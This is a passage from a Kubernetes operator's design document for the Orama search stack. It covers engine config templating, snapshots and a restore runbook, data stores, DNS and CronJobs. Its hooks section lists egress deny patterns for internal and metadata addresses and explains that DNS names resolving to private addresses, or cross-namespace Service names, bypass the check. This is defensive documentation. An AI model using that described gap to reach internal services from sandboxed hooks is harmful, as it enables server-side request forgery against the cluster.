  side compiled into it. The published `oramasearch/oramacore` image has both, so with it each
  reader also runs a writer (a producer on `oramacore-operations`, writer state on the reader's PVC,
  the writer API behind the reader Service) and the writer builds a second, reader-side index. Prod 1
  ships two builds instead (`--no-default-features --features reader`, `--features writer`). Set
  `spec.images.overrides.oramacore-writer` **and** `.oramacore-reader` to run them: the writer then
  renders `writer.yaml` (no `reader_side`) and the readers `reader.yaml` (no `writer_side`). One
  without the other fails the reconcile. Without them both sides keep the shared image and the
  combined `config.yaml`, and the CR carries
  `EngineSidesSeparated=False` saying the readers also run a writer. The side-only images are built
  by the bridge's `build/images`, not by the operator.
- **Stream connection names** — with side-only configs the writer names its stream connection
  (`client_provided_name` and `producer_name`) `<cr>-writer` and each reader names its own
  (`client_provided_name` and `consumer_name`) after its pod, `<cr>-reader-<ordinal>`: the reader
  template holds `__POD_NAME__`, which the `render-config` init container fills from the downward API
  (`POD_NAME`). These names are **labels only**, so broker connections can be told apart; they are
  not stream positions. In OramaCore v1.2.38 a reader resumes from the offset stored in its own data
  directory (`rabbit.rs`), so renaming a connection, or moving from the combined config, replays
  nothing. The combined config keeps the old shared names (`oramacore-writer`/`write`,
  `oramacore-reader`/`reader`).
- **Config** — a `ConfigMap` with `envoy.yaml` + **full, valid** OramaCore configs: the combined
  `config.yaml` (`http` / `log` / `writer_side` / `reader_side` / `ai_server`, matching
  `oramacore/config-docker.yaml`; `execution_providers` from `writer.gpu`, see **Embeddings**), or, with
  side-only images, `writer.yaml` and `reader.yaml`. Each is assembled from the same per-section
  renderers in `engine.go` (`engineCommonYAML`, `writerSideYAML`, `readerSideYAML`, `aiServerYAML`),
  so a section shared by both sides is written once. Every config is a **template** — `master_api_key` is a `__MASTER_API_KEY__`
  placeholder and each LLM key a `__<PROVIDER>_API_KEY__` placeholder, so **no credential lives in
  the ConfigMap**. A `render-config` **init container** substitutes the real values into a shared
  `emptyDir`: `MASTER_API_KEY` from the master API key Secret, the broker `user` and `password`
  (`__BROKER_USERNAME__`, `__BROKER_PASSWORD__`) from `<cr>-broker-admin`, and `<PROVIDER>_API_KEY`
  from `<cr>-engine-secret` (via `envFrom`), or a provider's key from its `apiKeySecretRef` (an `env`
  entry that overrides the `envFrom` one).
  Each value is escaped for `sed` and sits in a single-quoted YAML scalar, so any character but a
  newline is safe. OramaCore reads the result via `CONFIG_PATH=/etc/oramacore/config.yaml` (env
  override can't reach nested keys such as `writer_side.master_api_key` — `config`'s `ORAMACORE_`
  provider splits on `_`). The writer and reader pod templates each carry an
  `orama.cloud/config-hash` of their own template, so a config change (JWT, LLM providers, …) rolls
  the pods that render it, and with side-only configs only the side it affects. Key values are not
  in the template: after rotating a key in its Secret, restart the writer and readers. All children
  set an owner reference to the CR, so deleting the CR cascade-deletes them.
- **Sentry, log levels and metrics** ([#314](https://github.com/oramasearch/orama-operator/issues/314),
  `engine_observability.go`) — every config's `log` section carries Prod 1's `levels`
  (`oramacore: info`, `orama_js_pool: info`). With `engine.sentry` set it also carries
  `sentry_dns: '__SENTRY_DSN__'`, which `render-config` fills from `sentry.dsnSecretRef` (an explicit
  `env` entry, so the DSN never sits in the ConfigMap; an empty value deletes the line, leaving Sentry
  off), and `sentry_environment` `<environment>-writer` or `<environment>-reader` (default prefix
  `spec.region.name`). The combined config holds `<environment>-__ENGINE_SIDE__`, which `render-config`
  replaces with the pod's side. Prod 1 reports as `production-writer-us` and
  `production-reader-{us,europe,asia}`. Writer and reader pods carry `prometheus.io/scrape`,
  `prometheus.io/port: "8080"` and `prometheus.io/path: /metrics`; OramaCore serves `/metrics` on
  `:8080` (`http.with_prometheus`). Nothing in the cluster scrapes it yet (#15). `/metrics` is kept off
  the public hosts: Envoy answers it 404 before its catch-all route, and each engine Ingress has a
  companion `<cr>-writer-metrics` / `<cr>-reader-metrics` Ingress with an Exact `/metrics` rule on every
  one of its hosts, annotated `nginx.ingress.kubernetes.io/denylist-source-range: 0.0.0.0/0,::/0`, so
  ingress-nginx answers 403 (it prefers the Exact rule to the Prefix `/` one). That covers the writer,
  whose Ingress reaches OramaCore directly, and readers without Envoy. The deny is ingress-nginx's;
  with another `spec.ingressClassName` only the readers' Envoy route applies.
- **LLM providers** ([#304](https://github.com/oramasearch/orama-operator/issues/304), `engine_llm.go`)
  — `ai_server` mirrors the Prod 1 configs: `llm` is the `spec.llm.default` provider as an
  OpenAI-compatible remote (`local: false`, `host` = its base URL, `model` = its first model), which
  OramaCore uses for every request that names no provider; `remote_llms` has one entry per
  `spec.llm.providers[]` (`default_model` = its first model, `url` only when overridden, else
  OramaCore's built-in URL); and `embeddings.automatic_embeddings_selector` comes from
  `spec.llm.automaticEmbeddingsSelector`. The reconcile fails with `Ready=False` before rendering
  when the default or selector provider is not listed, a provider has no models or is listed twice,
  or a provider is `vllm`.
- **Hooks deny list** ([#306](https://github.com/oramasearch/orama-operator/issues/306),
  `engine_hooks.go`) <a id="hooks-deny-list"></a> — customer JavaScript hooks can make outbound HTTP
  calls, and OramaCore lets them reach any address unless `hooks.denied_domains` (or
  `allowed_domains`) is set. `writer_side.hooks` and `reader_side.hooks` are rendered from one
  helper, so both sides always carry the same block: Prod 1's `denied_domains`, entry for entry;
  a `**` form of each of its `<prefix>.*` IPv4 entries (`10.**`, `127.**`, `169.254.**`, …); the
  cluster's names (`localhost`, `*.svc`, `*.svc.cluster.local`, `*.cluster.local`, `kubernetes*`,
  `*.internal` and their `**` forms); IPv4-mapped and unspecified IPv6 (`::ffff:*`, `::`); the CR's
  own Service names (`<cr>-*`, `<cr>-*.**`); then `engine.hooks.extraDeniedDomains`, with
  duplicates dropped. Timeouts default to Prod 1's `evaluation_timeout: 200ms`,
  `execution_timeout: 1s`. orama-js-pool 0.4.3 (`src/permission.rs`, `check_net_url` and
  `glob_match`) matches each pattern against the URL's **host string**, never the resolved address,
  and turns `.` into a glob separator, so `*` stays within one label: Prod 1's `10.*` matches `10.0`
  but not `10.0.0.1`, which is why the `**` forms are added. Because the match is on the name, a
  public DNS name that resolves to a private address, or a Service in another namespace addressed
  as `<svc>.<ns>`, is not caught: a NetworkPolicy on engine egress is the complete fix (not done
  yet). A change to the list or the timeouts changes the config hash and rolls the engine.
- **Analytics** ([#55](https://github.com/oramasearch/orama-operator/issues/55)) — the config sets
  `reader_side.analytics`, so each pod logs search events under `<reader data_dir>/analytics_new`
  and serves them once through `GET /v1/analytics` (read-and-erase). Without the block the endpoint
  answers 500 and analytics-processor imports nothing. `api_key` is the same `__MASTER_API_KEY__`
  placeholder the `render-config` init container fills, because that is the key analytics-processor
  polls with. `metadata_from_headers` mirrors the prod reader configs (`user-agent`,
  `CF-Connecting-IP`, `CF-IPCountry`, `continent`, `colo`, `latitude`, `longitude` → `ua`, `ip`,
  `country`, …). Prod sets the block on readers only and with a dedicated key. With the combined config the
  writer's reader side logs too (it serves no search traffic, so normally nothing); `writer.yaml` has
  no reader side.
  With scheduled imports enabled, analytics-processor's `oramacores` lists each reader ordinal
  through its headless governing Service (the writer only with `import.includeWriter`), all with the
  master key.
  The unscheduled default retains reader-Service polling. See [Analytics import](#analytics-import).
- **Graceful shutdown** — OramaCore handles SIGTERM (drains HTTP, then force-commits
  BOTH sides to disk — `oramacore/src/lib.rs`, `web_server/mod.rs`; `CMD ["./oramacore"]`
  = PID 1). Because the writer's commit flushes indexes, the writer pod gets
  `terminationGracePeriodSeconds: 300` (readers: 60) so k8s doesn't SIGKILL the flush
  at the default 30s.
- **Health probes** — startup / readiness / liveness all hit `GET /health` on `:8080`
  (`oramacore/src/web_server/api/mod.rs`; also the prod ALB path). The **startup probe**
  gates the others so a slow index-load boot isn't killed: it runs every 10 s and allows
  `writer.startupTimeout` (default 20 min) or `reader.startupTimeout` (default 40 min, Prod 1's
  unit start timeout), because a reader restarted mid-load starts the load over and a large one
  would never become Ready. Readiness gates Service routing; liveness restarts a hung pod.
- **Preflight** — a `preflight` init container (busybox, uid 65534, read-only root, the hardening
  baseline) runs between `wait-for-broker` and `render-config` on the writer and every reader. It
  fails with a message naming the setting when the node's `vm.max_map_count` is below
  `engine.minMaxMapCount` (default 4194304) or the pod's `ulimit -n` is below `engine.minOpenFiles`
  (default 65535). A reader holds every memory mapping it opens until it restarts (about 50k a day
  on Prod 1), so at Ubuntu's 1048576 `mmap` fails with `ENOMEM` after about 20 days whatever the
  free memory. `vm.max_map_count` is not a namespaced sysctl: a pod cannot set it, so the operator
  checks it and the node pool sets it ([install.md](install.md#node-settings-for-the-engine)). The
  open-files limit comes from the container runtime and is the same for every container in the pod.
  Setting a minimum to `0` drops its check, and with both at `0` there is no `preflight` container.
- **Disruption budgets** — the **writer** gets a PDB with `maxUnavailable: 0` (it's a
  singleton — voluntary disruptions like node drains/autoscaler are blocked so it
  isn't casually evicted; **node maintenance must consciously handle it**). **Readers**
  get `maxUnavailable: 1` (roll one at a time, keep the rest serving).

### Engine volume snapshots ([#316](https://github.com/oramasearch/orama-operator/issues/316), `engine_snapshots.go`)

On Prod 2 the writer's `data` claim is the only copy of every index, and a reader rebuilds from the
replication stream only while the stream still holds the history. With
`spec.components.engine.snapshots.enabled` the reconciler (no CronJob, no extra service account) takes
CSI `VolumeSnapshot`s of `data-<cr>-writer-0` and of every `data-<cr>-reader-<n>` up to the reader
StatefulSet's current replica count, as Prod 1 snapshots its EBS volumes daily and keeps 7:

- **Schedule** — a 5-field cron in UTC, default `0 3 * * *`. A claim with no snapshot is snapshotted
  at once; after that, a claim is due when the schedule's next time after its newest snapshot has come.
  Timing comes only from the snapshots' `orama.cloud/snapshot-at` annotations, so an operator restart
  neither skips nor repeats a run. An invalid schedule (not five fields, a descriptor such as `@daily`,
  a time zone, or one that never fires) fails the reconcile with `Ready=False`/`ReconcileError`; the
  step runs last, so nothing else is blocked.
- **Snapshots** — named `<claim>-<UTC timestamp>` (`data-v1-writer-0-20261012t030000z`), labelled
  with the standard labels (`app.kubernetes.io/instance: <cr>`, `component: writer|reader`), with no
  owner reference: deleting the CR never deletes a snapshot.
- **Class** — default `orama-cloud-v1-retain`, created when absent for `disk.csi.azure.com` with
  `deletionPolicy: Retain`, as Lake's (DESIGN decision 39). A named class must exist and be `Retain`;
  otherwise no snapshot is taken and `SnapshotsReady` says why.
- **Pruning** — the same rules as Lake's, in the engine's own `pruneEngineSnapshots`: only ready snapshots count toward `keep`
  (default 7), the newest ready one is never deleted, only the newest failed one is kept, and a pruned
  snapshot's content is switched to `deletionPolicy: Delete` first so its disk snapshot goes with it.
  A snapshot whose content is not bound, or not bound back to it by the class's driver, is kept and
  logged. Snapshots of other CRs and hand-made ones are never touched.
- **Contents** — the content bound to each claim's newest ready snapshot gets the CR's labels and
  `orama.cloud/snapshot-{namespace,name,claim,at}` annotations, so it can be found after its
  namespace is gone.
- **Status** — `status.engineSnapshots[]` holds each claim's newest snapshot (name, time,
  `readyToUse`, error); `SnapshotsReady` is `False` while a claim's newest snapshot failed, its newest
  ready one is older than two schedule periods, or none is ready yet. Neither changes the phase. The
  CR is requeued at the next due time, and every 30 s while a snapshot is being cut.

**Restore a claim from a snapshot.** Prod 2 is production: a restore is a reviewed, approved step.
Snapshots of one run share a timestamp; restore the writer and readers from the same run so they agree.
Writes accepted after the snapshot are lost from the restored writer.

1. Pick the snapshot: `kubectl -n <ns> get volumesnapshot -l app.kubernetes.io/instance=<cr>` (the
   `readyToUse` column must be `true`), or `status.engineSnapshots`.
2. Stop the operator, which would otherwise scale the StatefulSet back:
   `kubectl -n orama-system scale deployment/orama-operator --replicas=0`. This pauses every CR it
   reconciles, so keep the window short.
3. Scale the component down: `kubectl -n <ns> scale statefulset <cr>-writer --replicas=0` (or
   `<cr>-reader`), and wait for its pods to go.
4. Keep the old volume: `kubectl patch pv <pv of the claim> -p '{"spec":{"persistentVolumeReclaimPolicy":"Retain"}}'`,
   then `kubectl -n <ns> delete pvc data-<cr>-writer-0`.
5. Recreate the claim under the same name from the snapshot, with the StorageClass of the old claim and
   at least the snapshot's `status.restoreSize`:

   ```yaml
   apiVersion: v1
   kind: PersistentVolumeClaim
   metadata:
     name: data-<cr>-writer-0
     namespace: <ns>
   spec:
     accessModes: [ReadWriteOnce]
     storageClassName: <class of the old claim>
     resources: {requests: {storage: <size>}}
     dataSource:
       apiGroup: snapshot.storage.k8s.io
       kind: VolumeSnapshot
       name: data-<cr>-writer-0-<timestamp>
   ```
6. Scale the StatefulSet back (`--replicas=1` for the writer, the reader count for readers), then the
   operator (`--replicas=1`). Check the CR is `Ready` and the writer answers `GET /health`; delete the
   retained old PV once the restore is confirmed.

If the namespace or the `VolumeSnapshot` is gone, the retained content is still there: find it with
`kubectl get volumesnapshotcontent -l app.kubernetes.io/instance=<cr>` and bind a new `VolumeSnapshot`
to it statically, as in [lake/volume-snapshots.md](lake/volume-snapshots.md), then restore as above.
Copying snapshots off Azure is [#33](https://github.com/oramasearch/orama-operator/issues/33).

**Validated on AKS (2026-07-08, before the readers became a StatefulSet):** applying a `primary`
CR created the writer STS (+ dynamically-provisioned PVC), the reader Deployment, both Services, and the
ConfigMap; the CR reaches **`Phase=Ready`** once every owned workload is ready — a status
roll-up over the live Deployment/StatefulSet + CNPG readiness (`internal/controller/status.go`,
[#37](https://github.com/oramasearch/orama-operator/issues/37)). Phase is
`Progressing | Ready | Degraded` (Degraded = a component regressed after being Ready); it also
exposes `status.componentsReady` (`22/22`, a print column), a **per-component list**
(`status.components[]` — one entry per deployable component, e.g. `writer 1/1`, `broker 1/1` — not
per-pod), and a standard `Ready` condition. The status subresource is **written only on a real
transition** (deep-compared first), so a steady stack generates no control-plane churn. Deleting
the CR GC'd everything. The
`render-config` init container renders the config, and **OramaCore 1.2.28 parses it and
boots** (`Configuration loaded successfully` → `Starting web server on
http://0.0.0.0:8080`); the ConfigMap shows only `master_api_key: "__MASTER_API_KEY__"`
while the rendered file in the pod holds the real value.

> **Follow-ups:** the reader→primary-writer endpoint on read tiers.

## controlDB (`internal/controller/controldb.go`)

The control-plane Postgres (PlanetScale in prod) as a **CloudNativePG `Cluster`**,
provisioned as an **unstructured** object so the operator stays decoupled from CNPG's
Go types/version. Requires the CNPG operator (installed via the helmfile).

- **Primary** — a fresh cluster, `spec.instances` from the profile (light 1 / medium
  2 / heavy 3), storage from `controlDB.storage` (default `10Gi` on the default StorageClass;
  CNPG grows the PVCs in place when the StorageClass allows expansion), `bootstrap.initdb`
  creating the `oramacore` database.
- **Read tier** (`role: read`, `replicate: true`) — a **replica cluster** streaming
  from the primary region's `postgresEndpoint` (`spec.replica` + `externalClusters`).
- `mode: external` connects to a database the operator does not own, such as the shared
  production PlanetScale while v1 migrates project by project
  ([orama-bridge#142](https://github.com/oramasearch/orama-bridge/issues/142)). It requires
  `credentialsSecretRef`, a Secret with keys `uri` and `password` (the same keys CNPG generates);
  without it the reconcile fails and the CR goes `Degraded`. Every control-DB client — dashboard,
  index-builder, analytics-processor — reads that Secret instead of `<cr>-controldb-app`. The
  operator creates no `Cluster`, applies no `PostgresSchema`, runs no migration, omits the
  `POSTGRES_HOST/PORT/DB` ConfigMap keys, and does not run pgAdmin.
- Owner ref on the `Cluster` → deleting the CR cascade-deletes it (CNPG then removes the pods/PVCs), unless deletion protection is on.
- **Deletion protection** — with `spec.deletionProtection` the `Cluster` and its `ScheduledBackup`
  carry **no reference to the CR** (the operator removes an existing one), so deleting the CR leaves the
  database running; `controlDB.enabled: false` also leaves both in place (released from the CR), and
  re-enabling adopts the same `Cluster`. Both objects record `orama.cloud/cloud-v1-owner-uid` before
  releasing the owner reference. Reconciliation, disable and backup-schedule removal refuse a
  foreign controller, a different recorded UID, or an existing unowned object without that marker.
  A recreated CR with the same name has a different UID and cannot silently adopt the retained DB.
  Legacy protected objects created without this annotation require a separately reviewed ownership
  handover; labels and names are insufficient proof. An existing CR-owned database gains the marker
  automatically, including when enabling protection and disabling the DB in the same edit.
  Protection preserves data; it does not qualify restart, restore, capacity or reader freshness.
  To really remove a protected database, turn protection off
  first, or delete the `Cluster` by hand.
- **Backups** (`controlDB.backup`, opt-in, primary only) — the same Barman setup as the `Lake`'s,
  in its own copy (`controldb_backup.go`): the Cluster gets `spec.backup.barmanObjectStore` (gzip WAL, `retentionPolicy`)
  pointing at `s3://<bucket>/<namespace>/<name>/controldb` by default, and the operator owns a
  `ScheduledBackup` `<cr>-controldb-backup` (six-field cron, default `0 0 3 * * *`, first backup
  immediately). The CR's `BackupReady` condition reports the newest CNPG `Backup`; an invalid config
  (no bucket, missing Secret or key) is reported there and configures nothing. R2 setup and the
  verification commands are the same as in [lake/backups.md](lake/backups.md).
- **Schema** — `assets/dashboard-schema.sql` is the dashboard's `.drizzle` migrations 0000..0008
  concatenated in journal order (19 tables), applied on the primary by the `<cr>-controldb-schema`
  `PostgresSchema` in one transaction, guarded on `crawler_configs` (created by 0000). A fresh control
  DB gets all of 0000..0008. A database that already has `crawler_configs` is left as is, so one built
  from an older vendored file does not receive 0008's tables; recreate the control DB (dev) or apply
  `0008_bouncy_ravenous.sql` by hand, which is fully guarded and safe to re-run. 0008 adds the
  `teams.subscription_plan_id` foreign key, so on a database with existing `teams` rows the default
  `subscription_plans` row must exist first.

**Validated on AKS (2026-07-07):** with the CNPG operator installed, a `medium`
primary CR produced a `Cluster` (instances=2, initdb=`oramacore`, owned by the CR);
CNPG bootstrapped Postgres; deleting the CR GC'd the cluster + its pods.

> **Follow-ups:** the replica cluster's `streaming_replica` credentials/secret wiring;
> exposing the DB name as a CR field; a Service alias the app can use; a restore rehearsal for the
> control DB like `LakeRestoreRehearsal`.

## Data stores — cache / broker / analytics / search (`internal/controller/datastore.go`)

A single generic `reconcileDataStore` provisions each as a **single-node
`StatefulSet` + PVC + Service**, parameterized per store (image, ports, data path,
env). Honors the `DataStoreSpec`: `enabled`, `mode: external` (skip — the app uses
the endpoint), and `placement: central` (only the primary runs it; read tiers skip
and reference the primary's endpoint). Images are overridable via
`spec.images.overrides.<component>`.

| Store | Component | Image | Ports |
|---|---|---|---|
| Redis | `cache` | `redis:7-alpine` | 6379 |
| RabbitMQ | `broker` | `rabbitmq:3.13-management` | 5672, 15672, 5552 |

Redis runs with `--requirepass $(REDIS_PASSWORD)` from `<cr>-cache-auth`. The broker's
`rabbitmq.conf` is a template whose `default_user`/`default_pass` a `render-config` init container
fills from `<cr>-broker-admin`; `enabled_plugins` is mounted from the ConfigMap as before. A store with
a config template carries an `orama.cloud/config-hash` annotation, so a template change rolls it. See
[Stack-wide credentials](#stack-wide-credentials-and-credentialsready-307-credentialsgo).
| ClickHouse | `analytics` | `clickhouse/clickhouse-server:24.8` | 8123, 9000 |
| Typesense | `search` | `typesense/typesense:0.25.2` | 8108 |

**Validated on AKS (2026-07-07):** a CR with all four enabled produced four
StatefulSets + Services + PVCs; **all four pods booted `1/1`**; deleting the CR
removed the workloads.

> **PVC size + retention:** each store's PVC is sized by its `storage` (`size`, default `10Gi`;
> `storageClassName`, default the cluster default). StatefulSet PVCs are **retained** on delete
> (the k8s default — data is left in place, not auto-deleted); `spec.deletionProtection` makes that
> explicit on every StatefulSet (`persistentVolumeClaimRetentionPolicy: Retain/Retain`) so a cluster
> with a different default can't delete them. Orphaned PVCs are cleaned up manually.

### Resizing a data volume

`volumeClaimTemplates` are immutable, so the operator applies a `storage` change only when it
creates a StatefulSet; an existing StatefulSet keeps the template it was created with (the reconcile
does not fail). To grow a running component's volume, expand each PVC (`kubectl patch pvc
data-<cr>-<component>-<n>` with the new `spec.resources.requests.storage`) on a StorageClass with
`allowVolumeExpansion`; the AKS built-in `managed-csi*` classes allow it. Set the same size in the CR
so a recreated StatefulSet matches. A different StorageClass needs a data migration and is not
automated.

Each store also gets the **workload-hardening baseline** (startup/readiness/liveness TCP probes, a
per-container securityContext, requests + a generous per-store memory limit, a `60s` grace period,
and a `maxUnavailable: 0` PDB) — see [Workload hardening](#workload-hardening--applied-to-every-component-18).

> **Follow-ups:** these are single-node for light/medium. **Heavy/production** should
> swap in the dedicated operators (Altinity ClickHouse, RabbitMQ cluster-operator) and
> a clustered Typesense; the Typesense API key is a seeded placeholder (reported by
> `CredentialsReady`). Binary-side right-sizing derived from the memory limits (Redis
> `maxmemory`, etc.) is [#42](https://github.com/oramasearch/orama-operator/issues/42).

## App compute — ingestion / workers / dashboard / docs (`app.go`, `ingestion.go`)

A generic `reconcileApp` provisions a stateless **Deployment + Service (+ Ingress if a
host is set)**.

- **ingestion** — `index-builder` Deployment (was Cloud Run); when `harvest` is on,
  also the HARVEST **master** Deployment, a **Mongo** StatefulSet (record store), and a
  **Selenium** grid Deployment.
- **workers** — the ported CF workers as **one bundled image** → a single Deployment
  (`workers.replicas`, image via `workers.image` or `spec.images.overrides.workers`).
- **dashboard** — a Deployment + Service + an **Ingress** on `dashboard.host`, with a rule for
  each of `dashboard.extraHosts` and an optional `tls` entry from `dashboard.tlsSecretName`
  ([crd-reference.md](crd-reference.md#public-hosts-and-origin-tls)). Every OramaCloudV1 Ingress
  uses `spec.ingressClassName` (default `nginx`).
  With `idp.provider: firebase`, it gets `FIREBASE_PROJECT_ID`, `FIREBASE_CLIENT_EMAIL` and
  `FIREBASE_PRIVATE_KEY` through required keys in `idp.configSecretRef`, replacing the unused
  service-account JSON dummy. The default `none` adds no Firebase variables. The referenced Secret
  is never copied into a ConfigMap or another Secret. Missing references degrade reconciliation;
  missing Secret keys block pod startup. Existing component Secrets may retain the unused old key.
  External ClickHouse uses `analytics.endpoint` as `CLICKHOUSE_HOST` and the referenced
  `CLICKHOUSE_USER`/`CLICKHOUSE_PASSWORD`; in-cluster wiring retains its existing defaults.
  Everything else (Stripe, Airbyte, S3, Slack, Upstash, `CRON_SECRET`, `PRIVATE_API_KEY`, ...) comes
  from `dashboard.envFrom` (user Secrets/ConfigMaps after the operator's sources) and `dashboard.env`
  (after the operator's env, replacing a same-named variable such as `CLICKHOUSE_HOST`). The
  operator-owned `DATABASE_URL`, `POSTGRES_PASSWORD`, `JWT_*` and `MASTER_API_KEY` are refused there. A
  missing referenced object fails the reconcile; the controller watches referenced Secrets and
  ConfigMaps and rolls the dashboard on a data change through a hash annotation (operator#311; see
  [crd-reference.md](crd-reference.md#dashboardenvfrom-and-dashboardenv)).
  `dashboard.crons` adds the scheduled calls Prod 1 runs from Vercel; see
  [Dashboard crons](#dashboard-crons).

**Validated on AKS (2026-07-08):** a CR with these enabled produced the 5 Deployments,
the Mongo StatefulSet, the dashboard Ingress, and 6 Services; CR-delete GC'd them.

> **Follow-ups:** images for `index-builder` / `harvest` / `dashboard` / the `workers`
> bundle are **placeholders** (`oramasearch/<name>:latest`) pending published/built
> images — override via `spec.images.overrides`. HARVEST's Podman-per-job worker model
> needs porting to k8s Jobs (the master + Mongo + Selenium are here; the job spawner
> is a follow-up). Dashboard/index-builder need their env + secret wiring
> (control-plane DB URL, API keys) via the component secret.

## DISCO (`disco.go`)

A `Deployment` (in-memory → no PVC; restart cold-starts the cache) running the Go **DISCO** service
(`:8080`), with no embeddings sidecar. DISCO reads its embeddings backend from
`EMBEDDINGS_GRPC_HOST`/`EMBEDDINGS_GRPC_PORT` and speaks its own `EmbeddingService` gRPC contract,
which no service the operator runs implements, so the operator leaves both at DISCO's defaults. The
`EMBEDDINGS_ENDPOINT` it used to set (DISCO never read it) is gone
([#305](https://github.com/oramasearch/orama-operator/issues/305)); choosing DISCO's embeddings
backend is a separate decision.
Routed through the shared `reconcileApp` builder, so it inherits the workload-hardening baseline
(probes, securityContext, resources, PDB, grace). Service on `:8080`. **Validated on AKS.**

## IdP + demoSeed (`idp.go`)

- **idp** — when `idp.provider=keycloak`, deploys **Keycloak** (`Deployment` + Service,
  `start-dev`). `none`/`firebase`/`clerk` are external (nothing deployed). Validated on
  AKS (Keycloak booted `1/1`). Admin creds are dev placeholders → edit the keycloak secret in prod.
- **demoSeed** — when `demoSeed: true`, creates a one-shot **Job** (create-if-absent).
  Today it's a **placeholder** (echo); the real seed will create a demo
  project+index+docs via the API once the engine is Ready. Validated on AKS (Job ran
  to `Complete`).

## Cloudflare (`cloudflare.go`) — 🟡 implemented, not live-tested

Cloudflare stays the permanent edge/geo-LB. The operator owns `<cr>-dashboard-dns`,
`<cr>-writer-dns` and `<cr>-reader-dns` `CloudflareDNSRecord` CRs for their configured public hosts.
Each record points at its own Ingress's assigned IP or hostname, with proxying enabled. The child
controller makes the API call; the main reconciler only writes desired resources. It waits for an
Ingress address and preserves an existing record while a replacement address is pending.

Creation requires `enabled`, `manageDNS`, `apiTokenSecretRef` (keys `token`, `zoneID`, `accountID`)
and an enabled component with a host. Clearing a host, disabling the component or disabling managed
DNS deletes the owned child record; its finalizer removes external DNS. A foreign resource is never
deleted on this path. A provisioned host or credential-reference change finalizes the old child
before recreating its resource name, so name-based upsert cannot orphan the old record. Keep the
old Cloudflare credential Secret available through finalization. `spec.cloudflare.zoneIDs` maps zone names to
zone IDs; each host takes the longest matching zone suffix (else the Secret's `zoneID`) into its
child's `spec.zoneID`, so one CR can serve `orama.ing` and `orama.com` names. The DNS child controller
creates new records but changes existing ones no more than it did before operator#312 (owner
decision 2026-10-12: existing DNS settings stay as they are). A record it
creates carries the Cloudflare comment `orama-operator:<namespace>/<name>`; a foreign record that
already holds the name blocks it with `ready: false` (so setting `app.orama.com` before the switch
cannot repoint Prod 1's record). Records created earlier are recognised by `status.recordID` without
any write and never gain the comment. A zone change on an existing record is refused (`ready: false`,
nothing changes in either zone); mapping a host to the zone it is already in changes nothing. On
delete, a commented record is removed only if it still carries its comment, and a legacy record is
removed by ID as before (see `CloudflareDNSRecord` in `crd-reference.md`). Prod 2's hosts are `app.orama.ing`, `reader.orama.ing` and
`writer.orama.ing`, one level deep so Cloudflare's `*.orama.ing` certificate covers them (operator#317). Engine hosts reuse the dashboard's nginx ingress-class behavior.

These endpoint and DNS changes are unit-tested as of 2026-10-07 and have not been applied to AKS or
Cloudflare. Prod 1's records remain read-only; this work makes no production calls.

## Dashboard crons

`spec.components.dashboard.crons.enabled` owns three CronJobs, `<cr>-dashboard-cron-crawler`,
`-index-gc` and `-consumption-sync`, the in-cluster equivalent of Prod 1's Vercel crons (operator#17).
Each runs `curlimages/curl:8.10.1` to `GET http://<cr>-dashboard:3000<path>` with
`Authorization: Bearer $CRON_SECRET`; the dashboard routes return 401 without it. `CRON_SECRET`
comes from a `secretKeyRef` to the Secret key the dashboard reads it from (or `crons.secretRef`) and
goes to curl on stdin. The pods use the CR's pull secrets, carry the hardening baseline
and resource limits, and mount no service-account token. `Forbid` prevents overlapping runs (a slow
crawler run makes the next minute's run skip); `--fail` makes a non-2xx response a failed Job.

They are created suspended (`crons.suspend` defaults to true): two stacks running them at once would
crawl and bill twice. At the cutover Prod 1's Vercel crons are switched off and `suspend: false` is
set in the same step. Disabling the crons, or the dashboard, deletes the CronJobs this CR owns.
Run outcomes are visible in Job status and logs; the stack's readiness does not include them.

## Analytics import

`spec.components.analyticsProcessor.import.enabled` owns a CronJob `<cr>-analytics-import`, which
uses the existing `curlimages/curl:8.10.1` helper image to call
`POST http://<cr>-analytics-processor:8080/import`. It uses the CR's pull secrets, has
resource limits and the container hardening baseline, and mounts neither credentials nor a
service-account token. The default schedule is every five minutes, in UTC. `Forbid` prevents
concurrent Jobs; request retries and Job retries are off because imports drain reader logs.
HTTP failures fail the Job, with a 10-second connect timeout, 240-second request timeout and
300-second Job deadline. Histories retain one successful/failed Job each, with a one-hour TTL.
The stack's readiness still measures workloads; import failures are visible in Job status/logs.
A timed-out HTTP request may leave the server finishing an import, so check that run before
manually triggering another. Importer delivery guarantees remain those of the source processor.

The processor is one Deployment with an init-rendered YAML config. Every new opted-in reader stack
uses `<cr>-reader-headless` as the StatefulSet's governing Service and polls
`http://<cr>-reader-<ordinal>.<cr>-reader-headless.<namespace>.svc:8080/v1/analytics` for every current
desired replica.

**Every reader exactly once ([#315](https://github.com/oramasearch/orama-operator/issues/315)).**
`GET /v1/analytics` returns and erases a reader's pending events (oramacore
`sides/read/analytics.rs`, `get_and_erase`), so the processor is the only thing that may call it:
the e2e suite does not, and each ordinal appears once in the config. The writer's reader side is
listed only with `import.includeWriter` (it serves no search traffic). Sources cover ordinals
`0..max(replicas, highest reader PVC ordinal + 1) - 1`, where replicas is the larger of the
StatefulSet's desired and current count, so a terminating pod still counts. A scale-down (by the CR
or the HPA) retains the removed ordinals' PVCs, and with them any events not yet pulled; those
ordinals stay in the config with `enabled: false` until their pod returns, when they are pulled
again. They are disabled rather than left enabled because the processor (analytics-processor
`importer.rs`, `import_analytics`, at `11a6c2d`) pulls sources in order and aborts the run at the
first one it cannot reach; it skips only sources marked disabled. Events on a PVC whose ordinal never
returns are not imported; a scale-down without loss needs those events pulled before the pod stops,
which the operator does not do. `status.analyticsImport` lists the configured sources and the
CronJob's last successful run. The normal `<cr>-reader:80` Service continues to serve customer reads. StatefulSet
scale events, including HPA changes, update the list and the processor's config-hash annotation,
so a rollout applies the new config. This hash also adds one initial rollout for an existing
unscheduled processor; its polling behavior otherwise stays the same. Both engine and processor
Both read `MASTER_API_KEY` from the one master API key Secret.

An existing reader StatefulSet keeps its immutable governing Service name. If it still uses
`<cr>-reader`, enabling imports fails visibly before creating Jobs; migrate its reader topology
under a separate reviewed change first. The operator does not delete/recreate readers to do this.
Disabling imports removes the CronJob and retains the live governing headless Service. Disabling
the processor removes its workload, config and schedule. Missing enabled engine/analytics/controlDB,
a bad schedule or a legacy governing Service removes any previous schedule and returns a reconcile
error. External ClickHouse requires an HTTP(S) endpoint without embedded credentials and a referenced
Secret holding `CLICKHOUSE_USER` and `CLICKHOUSE_PASSWORD`; the processor renders those credentials
in its private volume. Prod 2 keeps ClickHouse Cloud, with no new in-cluster ClickHouse store.
